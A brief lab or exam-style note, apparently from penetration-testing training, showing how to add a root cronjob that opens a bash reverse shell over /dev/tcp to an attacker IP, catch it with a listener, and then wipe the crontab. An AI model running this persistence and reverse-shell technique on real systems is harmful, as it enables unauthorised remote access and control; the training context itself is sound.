> If we have a webshell then after we become root we can get a reverse shell so it is valid for display our local/proof file. Here we create a cronjob to run this reverse shell:

```
(crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/192.168.x.x/<port> 0>&1'") | crontab -
```

> Start a listener:

```
penelope -i tun0 -p <port>
```

> After we receive a shell we can remove the cronjob from the original shell:

```
crontab -r
```
